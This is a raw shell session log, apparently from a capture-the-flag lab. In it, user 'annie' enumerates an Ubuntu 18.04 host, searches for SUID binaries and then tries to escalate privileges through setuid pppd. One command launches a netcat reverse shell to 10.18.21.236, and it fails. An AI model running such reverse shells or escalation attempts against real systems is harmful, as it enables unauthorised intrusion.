prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:49 ad_mailbox_7778_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:48 ad_mailbox_7778_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:50 ad_mailbox_7832_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:49 ad_mailbox_7832_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:51 ad_mailbox_7907_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:50 ad_mailbox_7907_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:52 ad_mailbox_7960_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:51 ad_mailbox_7960_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:53 ad_mailbox_8017_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:52 ad_mailbox_8017_0_1_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:53 ad_mailbox_8073_0_0_evt_subevt_0
prwxrwxrwx  1 gdm   gdm       0 Jun 13 13:53 ad_mailbox_8073_0_1_evt_subevt_0
annie@desktop:/tmp/anydesk$ cd ..
annie@desktop:/tmp$ ls -la
total 92
drwxrwxrwt 14 root  root   4096 Jun 13 13:53 .
drwxr-xr-x 22 root  root   4096 Mar 23  2022 ..
drwxrwxrwx  2 annie annie 28672 Jun 13 13:53 anydesk
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .font-unix
drwxrwxrwt  2 root  root   4096 Jun 13 12:45 .ICE-unix
drwx------  3 root  root   4096 Jun 13 12:45 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-bolt.service-xFgXJT
drwx------  3 root  root   4096 Jun 13 12:45 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-colord.service-rJow5x
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-ModemManager.service-APe311
drwx------  3 root  root   4096 Jun 13 12:41 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-rtkit-daemon.service-LB3OnB
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-systemd-resolved.service-TdhIlP
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-systemd-timesyncd.service-0lF5ro
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .Test-unix
-r--r--r--  1 gdm   gdm      11 Jun 13 12:45 .X1024-lock
-r--r--r--  1 root  root     11 Jun 13 12:40 .X10-lock
drwxrwxrwt  2 root  root   4096 Jun 13 12:45 .X11-unix
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .XIM-unix
annie@desktop:/tmp$ cd ..
annie@desktop:/$ ls -la
total 970064
drwxr-xr-x  22 root root      4096 Mar 23  2022 .
drwxr-xr-x  22 root root      4096 Mar 23  2022 ..
drwxr-xr-x   2 root root      4096 Mar 23  2022 bin
drwxr-xr-x   3 root root      4096 Mar 23  2022 boot
drwxr-xr-x  17 root root      3680 Jun 13 12:40 dev
drwxr-xr-x 109 root root      4096 May 14  2022 etc
drwxr-xr-x   3 root root      4096 Mar 23  2022 home
lrwxrwxrwx   1 root root        34 Mar 23  2022 initrd.img -> boot/initrd.img-4.15.0-173-generic
lrwxrwxrwx   1 root root        33 Mar 23  2022 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x  18 root root      4096 Mar 23  2022 lib
drwxr-xr-x   2 root root      4096 Mar 23  2022 lib64
drwx------   2 root root     16384 Mar 23  2022 lost+found
drwxr-xr-x   4 root root      4096 Mar 23  2022 media
drwxr-xr-x   2 root root      4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root      4096 Mar 23  2022 opt
dr-xr-xr-x 139 root root         0 Jun 13 12:40 proc
drwx------   5 root root      4096 Mar 23  2022 root
drwxr-xr-x  21 root root       640 Jun 13 13:49 run
drwxr-xr-x   2 root root     12288 Mar 23  2022 sbin
drwxr-xr-x   2 root root      4096 Feb  3  2020 srv
-rw-------   1 root root 993244160 Mar 23  2022 swapfile
dr-xr-xr-x  13 root root         0 Jun 13 13:52 sys
drwxrwxrwt  14 root root      4096 Jun 13 13:53 tmp
drwxr-xr-x  10 root root      4096 Mar 23  2022 usr
drwxr-xr-x  12 root root      4096 Mar 23  2022 var
lrwxrwxrwx   1 root root        31 Mar 23  2022 vmlinuz -> boot/vmlinuz-4.15.0-173-generic
lrwxrwxrwx   1 root root        30 Mar 23  2022 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
annie@desktop:/$ cd opt
annie@desktop:/opt$ ls -la
total 8
drwxr-xr-x  2 root root 4096 Mar 23  2022 .
drwxr-xr-x 22 root root 4096 Mar 23  2022 ..
annie@desktop:/opt$ cd ..
annie@desktop:/$ ls -la
total 970064
drwxr-xr-x  22 root root      4096 Mar 23  2022 .
drwxr-xr-x  22 root root      4096 Mar 23  2022 ..
drwxr-xr-x   2 root root      4096 Mar 23  2022 bin
drwxr-xr-x   3 root root      4096 Mar 23  2022 boot
drwxr-xr-x  17 root root      3680 Jun 13 12:40 dev
drwxr-xr-x 109 root root      4096 May 14  2022 etc
drwxr-xr-x   3 root root      4096 Mar 23  2022 home
lrwxrwxrwx   1 root root        34 Mar 23  2022 initrd.img -> boot/initrd.img-4.15.0-173-generic
lrwxrwxrwx   1 root root        33 Mar 23  2022 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x  18 root root      4096 Mar 23  2022 lib
drwxr-xr-x   2 root root      4096 Mar 23  2022 lib64
drwx------   2 root root     16384 Mar 23  2022 lost+found
drwxr-xr-x   4 root root      4096 Mar 23  2022 media
drwxr-xr-x   2 root root      4096 Feb  3  2020 mnt
drwxr-xr-x   2 root root      4096 Mar 23  2022 opt
dr-xr-xr-x 139 root root         0 Jun 13 12:40 proc
drwx------   5 root root      4096 Mar 23  2022 root
drwxr-xr-x  21 root root       640 Jun 13 13:49 run
drwxr-xr-x   2 root root     12288 Mar 23  2022 sbin
drwxr-xr-x   2 root root      4096 Feb  3  2020 srv
-rw-------   1 root root 993244160 Mar 23  2022 swapfile
dr-xr-xr-x  13 root root         0 Jun 13 13:52 sys
drwxrwxrwt  14 root root      4096 Jun 13 13:53 tmp
drwxr-xr-x  10 root root      4096 Mar 23  2022 usr
drwxr-xr-x  12 root root      4096 Mar 23  2022 var
lrwxrwxrwx   1 root root        31 Mar 23  2022 vmlinuz -> boot/vmlinuz-4.15.0-173-generic
lrwxrwxrwx   1 root root        30 Mar 23  2022 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
annie@desktop:/$ cd var
annie@desktop:/var$ ls -la
total 48
drwxr-xr-x 12 root root   4096 Mar 23  2022 .
drwxr-xr-x 22 root root   4096 Mar 23  2022 ..
drwxr-xr-x  2 root root   4096 May 11  2022 backups
drwxr-xr-x 12 root root   4096 Mar 23  2022 cache
drwxrwxrwt  2 root root   4096 Jun 13 12:59 crash
drwxr-xr-x 49 root root   4096 Mar 23  2022 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Mar 23  2022 lock -> /run/lock
drwxrwxr-x  8 root syslog 4096 Jun 13 12:59 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Mar 23  2022 run -> /run
drwxr-xr-x  4 root root   4096 Mar 23  2022 spool
drwxrwxrwt  8 root root   4096 Jun 13 12:45 tmp
annie@desktop:/var$ cd backups
annie@desktop:/var/backups$ ls -la
total 60
drwxr-xr-x  2 root root  4096 May 11  2022 .
drwxr-xr-x 12 root root  4096 Mar 23  2022 ..
-rw-r--r--  1 root root 51389 Mar 23  2022 apt.extended_states.0
annie@desktop:/var/backups$ cd ..
annie@desktop:/var$ ls -la
total 48
drwxr-xr-x 12 root root   4096 Mar 23  2022 .
drwxr-xr-x 22 root root   4096 Mar 23  2022 ..
drwxr-xr-x  2 root root   4096 May 11  2022 backups
drwxr-xr-x 12 root root   4096 Mar 23  2022 cache
drwxrwxrwt  2 root root   4096 Jun 13 12:59 crash
drwxr-xr-x 49 root root   4096 Mar 23  2022 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Mar 23  2022 lock -> /run/lock
drwxrwxr-x  8 root syslog 4096 Jun 13 12:59 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Mar 23  2022 run -> /run
drwxr-xr-x  4 root root   4096 Mar 23  2022 spool
drwxrwxrwt  8 root root   4096 Jun 13 12:45 tmp
annie@desktop:/var$ cd mail
annie@desktop:/var/mail$ ls -la
total 8
drwxrwsr-x  2 root mail 4096 Feb  3  2020 .
drwxr-xr-x 12 root root 4096 Mar 23  2022 ..
annie@desktop:/var/mail$ cd ..
annie@desktop:/var$ cd mail
annie@desktop:/var/mail$ ls -la
total 8
drwxrwsr-x  2 root mail 4096 Feb  3  2020 .
drwxr-xr-x 12 root root 4096 Mar 23  2022 ..
annie@desktop:/var/mail$ cd ..
annie@desktop:/var$ ls -la log
total 4680
drwxrwxr-x   8 root   syslog             4096 Jun 13 12:59 .
drwxr-xr-x  12 root   root               4096 Mar 23  2022 ..
-rwxrwxrwx   1 root   root             951706 Jun 13 13:54 anydesk.trace
-rw-r-----   1 root   adm               28096 Jun 13 12:59 apport.log
drwxr-xr-x   2 root   root               4096 May 11  2022 apt
-rw-r-----   1 syslog adm               62960 Jun 13 13:54 auth.log
-rw-rw----   1 root   utmp                  0 Feb  3  2020 btmp
drwxr-xr-x   2 root   root               4096 Jan 24  2020 dist-upgrade
-rw-r--r--   1 root   root              32032 Mar 23  2022 faillog
drwx--x--x   2 root   gdm                4096 Oct 27  2020 gdm3
drwxr-xr-x   3 root   root               4096 Mar 23  2022 installer
drwxr-sr-x+  3 root   systemd-journal    4096 Mar 23  2022 journal
-rw-r-----   1 syslog adm              412347 Jun 13 12:59 kern.log
-rw-rw-r--   1 root   utmp             292292 Jun 13 13:44 lastlog
-rw-r-----   1 syslog adm             3175633 Jun 13 13:54 syslog
-rw-------   1 root   root              64064 Mar 23  2022 tallylog
-rw-------   1 root   root                157 Jun 13 12:59 ubuntu-advantage-timer.log
drwxr-xr-x   2 root   root               4096 May 11  2022 vmware
-rw-rw-r--   1 root   utmp              28800 Jun 13 13:44 wtmp
annie@desktop:/var$ whoami
annie
annie@desktop:/var$ hostname
desktop
annie@desktop:/var$ uname-a
uname-a: command not found
annie@desktop:/var$ uname -a
Linux desktop 4.15.0-173-generic #182-Ubuntu SMP Fri Mar 18 15:53:46 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
annie@desktop:/var$ cat &etc/os-release
[1] 8240
-bash: etc/os-release: No such file or directory
annie@desktop:/var$ cat /etc/os-release
NAME="Ubuntu"
VERSION="18.04.6 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.6 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic

[1]+  Stopped                 cat
annie@desktop:/var$ cat /proc/version
Linux version 4.15.0-173-generic (buildd@lcy02-amd64-094) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #182-Ubuntu SMP Fri Mar 18 15:53:46 UTC 2022
annie@desktop:/var$ cat /etc/issue
Ubuntu 18.04.6 LTS \n \l

annie@desktop:/var$ ls -la
total 48
drwxr-xr-x 12 root root   4096 Mar 23  2022 .
drwxr-xr-x 22 root root   4096 Mar 23  2022 ..
drwxr-xr-x  2 root root   4096 May 11  2022 backups
drwxr-xr-x 12 root root   4096 Mar 23  2022 cache
drwxrwxrwt  2 root root   4096 Jun 13 12:59 crash
drwxr-xr-x 49 root root   4096 Mar 23  2022 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Mar 23  2022 lock -> /run/lock
drwxrwxr-x  8 root syslog 4096 Jun 13 12:59 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Mar 23  2022 run -> /run
drwxr-xr-x  4 root root   4096 Mar 23  2022 spool
drwxrwxrwt  8 root root   4096 Jun 13 12:45 tmp
annie@desktop:/var$ env
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
SSH_CONNECTION=10.18.21.236 48750 10.10.245.157 22
LESSCLOSE=/usr/bin/lesspipe %s %s
LANG=en_US.UTF-8
XDG_SESSION_ID=131
USER=annie
PWD=/var
HOME=/home/annie
SSH_CLIENT=10.18.21.236 48750 22
SSH_TTY=/dev/pts/1
MAIL=/var/mail/annie
TERM=xterm-256color
SHELL=/bin/bash
SHLVL=1
LANGUAGE=en_US:
LOGNAME=annie
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
XDG_RUNTIME_DIR=/run/user/1000
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
LESSOPEN=| /usr/bin/lesspipe %s
_=/usr/bin/env
OLDPWD=/var/mail
annie@desktop:/var$ ls -la spool
total 16
drwxr-xr-x  4 root   root 4096 Mar 23  2022 .
drwxr-xr-x 12 root   root 4096 Mar 23  2022 ..
drwxr-xr-x  3 root   root 4096 Mar 23  2022 cron
lrwxrwxrwx  1 root   root    7 Mar 23  2022 mail -> ../mail
drwx------  2 syslog adm  4096 Apr 24  2018 rsyslog
annie@desktop:/var$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
annie@desktop:/var$ ss -tulpn
Netid State    Recv-Q   Send-Q           Local Address:Port      Peer Address:Port  
udp   UNCONN   0        0                127.0.0.53%lo:53             0.0.0.0:*     
udp   UNCONN   0        0                      0.0.0.0:57916          0.0.0.0:*     
udp   UNCONN   0        0           10.10.245.157%eth0:68             0.0.0.0:*     
udp   UNCONN   0        0                      0.0.0.0:5353           0.0.0.0:*     
udp   UNCONN   0        0                      0.0.0.0:50001          0.0.0.0:*     
udp   UNCONN   0        0                         [::]:56342             [::]:*     
udp   UNCONN   0        0                         [::]:5353              [::]:*     
tcp   LISTEN   0        1                      0.0.0.0:37429          0.0.0.0:*     
tcp   LISTEN   0        128              127.0.0.53%lo:53             0.0.0.0:*     
tcp   LISTEN   0        128                    0.0.0.0:22             0.0.0.0:*     
tcp   LISTEN   0        1                      0.0.0.0:7070           0.0.0.0:*     
tcp   LISTEN   0        128                       [::]:22                [::]:*     
annie@desktop:/var$ sudo -l
[sudo] password for annie: 
Sorry, try again.
[sudo] password for annie: 
Sorry, try again.
[sudo] password for annie: 
sudo: 3 incorrect password attempts
annie@desktop:/var$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} + 2> /dev/null|cat
-rwsr-xr-x 1 root root        30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root        43088 Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root root        64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root        44664 Jan 25  2022 /bin/su
-rwsr-xr-x 1 root root        26696 Sep 16  2020 /bin/umount
-rwxr-sr-x 1 root shadow      34816 Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwsr-xr-x 1 root root        10232 Nov 16  2017 /sbin/setcap
-rwxr-sr-x 1 root shadow      34816 Apr  8  2021 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root        22528 Jun 28  2019 /usr/bin/arping
-rwxr-sr-x 1 root tty         14328 Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow      71816 Jan 25  2022 /usr/bin/chage
-rwsr-xr-x 1 root root        76496 Jan 25  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root        44528 Jan 25  2022 /usr/bin/chsh
-rwxr-sr-x 1 root crontab     39352 Nov 15  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow      22808 Jan 25  2022 /usr/bin/expiry
-rwsr-xr-x 1 root root        75824 Jan 25  2022 /usr/bin/gpasswd
-rwxr-sr-x 1 root mlocate     43088 Mar  1  2018 /usr/bin/mlocate
-rwsr-xr-x 1 root root        40344 Jan 25  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root        59640 Jan 25  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root        22520 Jan 12  2022 /usr/bin/pkexec
-rwxr-sr-x 1 root ssh        362640 Mar  2  2020 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root       149080 Jan 19  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwxr-sr-x 1 root tty         30800 Sep 16  2020 /usr/bin/wall
-rwsr-xr-- 1 root messagebus  42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwxr-sr-x 1 root mail        14336 Jul  8  2020 /usr/lib/evolution/camel-lock-helper-1.2
-rwsr-xr-x 1 root root       436552 Mar  2  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        14328 Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwxr-sr-x 1 root utmp        10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 root root        10232 Dec 14  2021 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root dip        378600 Jul 23  2020 /usr/sbin/pppd

```

```
annie@desktop:/var$ id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
annie@desktop:/var$ find / -type f -group lpadmin 2>/dev/null
annie@desktop:/var$ find / -type f -group plugdev 2>/dev/null
annie@desktop:/var$ find / -type f -group dip 2>/dev/null
/usr/sbin/pppd
/etc/chatscripts/provider
/etc/ppp/peers/provider
annie@desktop:/var$ ls -la /usr/sbin/pppd
-rwsr-xr-- 1 root dip 378600 Jul 23  2020 /usr/sbin/pppd
annie@desktop:/var$ echo “id >/dev/tty” > id.sh
-bash: /dev/tty”: Permission denied
annie@desktop:/var$ cd tmp
annie@desktop:/var/tmp$ cd /tmp
annie@desktop:/tmp$ echo “id >/dev/tty” > id.sh
-bash: /dev/tty”: Permission denied
annie@desktop:/tmp$ bash
annie@desktop:/tmp$ echo “id >/dev/tty” > id.sh
bash: /dev/tty”: Permission denied
annie@desktop:/tmp$ nano id.sh
annie@desktop:/tmp$ chmod 755 id.sh
annie@desktop:/tmp$ sudo /usr/sbin/pppd connect $PWD/id.sh
[sudo] password for annie: 

Sorry, try again.
[sudo] password for annie: 
^C
sudo: 2 incorrect password attempts
annie@desktop:/tmp$ 
annie@desktop:/tmp$ /usr/sbin/pppd connect $PWD/id.sh
/usr/sbin/pppd: The remote system is required to authenticate itself
/usr/sbin/pppd: but I couldn't find any suitable secret (password) for it to use to do so.
annie@desktop:/tmp$ pppd connect “netcat -e /bin/bash 10.18.21.236 444”
pppd: unrecognized option '-e'
pppd version 2.4.7
Usage: pppd [ options ], where options are:
        <device>        Communicate over the named device
        <speed>         Set the baud rate to <speed>
        <loc>:<rem>     Set the local and/or remote interface IP
                        addresses.  Either one may be omitted.
        asyncmap <n>    Set the desired async map to hex <n>
        auth            Require authentication from peer
        connect <p>     Invoke shell command <p> to set up the serial line
        crtscts         Use hardware RTS/CTS flow control
        defaultroute    Add default route through interface
        file <f>        Take options from file <f>
        modem           Use modem control lines
        mru <n>         Set MRU value to <n> for negotiation
See pppd(8) for more options.
annie@desktop:/tmp$ pppd connect "netcat -e /bin/bash 10.18.21.236 444"
pppd: The remote system is required to authenticate itself
pppd: but I couldn't find any suitable secret (password) for it to use to do so.
annie@desktop:/tmp$ ^C
annie@desktop:/tmp$ ls -la
total 104
drwxrwxrwt 14 root  root   4096 Jun 13 15:03 .
drwxr-xr-x 22 root  root   4096 Mar 23  2022 ..
drwxrwxrwx  2 annie annie 36864 Jun 13 15:03 anydesk
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .font-unix
drwxrwxrwt  2 root  root   4096 Jun 13 12:45 .ICE-unix
-rwxr-xr-x  1 annie annie    13 Jun 13 14:10 id.sh
drwx------  3 root  root   4096 Jun 13 12:45 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-bolt.service-xFgXJT
drwx------  3 root  root   4096 Jun 13 12:45 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-colord.service-rJow5x
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-ModemManager.service-APe311
drwx------  3 root  root   4096 Jun 13 12:41 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-rtkit-daemon.service-LB3OnB
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-systemd-resolved.service-TdhIlP
drwx------  3 root  root   4096 Jun 13 12:40 systemd-private-7ca14f2d26ce4dd49c408411f58174b4-systemd-timesyncd.service-0lF5ro
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .Test-unix
-r--r--r--  1 gdm   gdm      11 Jun 13 12:45 .X1024-lock
-r--r--r--  1 root  root     11 Jun 13 12:40 .X10-lock
drwxrwxrwt  2 root  root   4096 Jun 13 12:45 .X11-unix
drwxrwxrwt  2 root  root   4096 Jun 13 12:40 .XIM-unix
annie@desktop:/tmp$ Connection to 10.10.245.157 closed by remote host.
Connection to 10.10.245.157 closed.

```